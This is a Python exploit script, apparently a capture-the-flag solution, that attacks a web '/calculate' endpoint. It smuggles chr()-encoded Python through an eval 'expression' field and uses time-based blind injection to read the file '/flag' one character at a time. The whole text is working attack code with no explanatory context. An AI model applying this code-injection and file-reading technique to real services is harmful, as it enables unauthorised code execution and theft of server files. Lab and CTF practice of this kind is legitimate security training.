# -*- coding:utf-8 -*-
import requests
import json
import string

header = {
"Content-Type":"application/json"}
url = "http://ef31f342-732e-4d1c-938c-f1dda310d553.node3.buuoj.cn/calculate"

def foo(payload):
    return "+".join(["chr(%d)"%ord(x) for x in payload])

flag = ''
for i in range(20):
    for j in string.ascii_letters + string.digits + '{_}':
        exp = "__import__('time').sleep(3) if open('/flag').read()[%d]=='%s' else 1"%(i,j)
        data = {
            "expression": "eval(" + foo(exp) + ")",
            "isVip":True
        }
        try:
            r = requests.post(headers=header,url=url,data=json.dumps(data),timeout=2)
            #print r.elapsed
        except:
            flag += j
            print("[+] flag:",flag)
            break